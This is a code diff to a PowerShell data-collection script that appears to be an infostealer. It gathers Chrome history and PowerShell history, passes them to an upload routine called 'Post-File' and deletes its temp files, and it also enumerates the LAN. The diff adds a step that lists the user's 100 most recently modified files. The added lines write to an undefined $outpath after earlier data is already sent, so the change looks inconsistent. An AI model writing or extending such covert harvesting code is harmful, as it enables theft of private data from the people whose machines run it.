@@ -356,6 +356,7 @@ Post-File ;rm -Path $FilePath -Force
 }
 
 Function History-Info{
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
 $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
 $Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
@@ -373,6 +374,8 @@ $FilePath = "$env:temp\History.txt"
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 Post-File ;rm -Path $FilePath -Force
+"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($RecentFiles | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 }
 
 Function Enumerate-LAN{
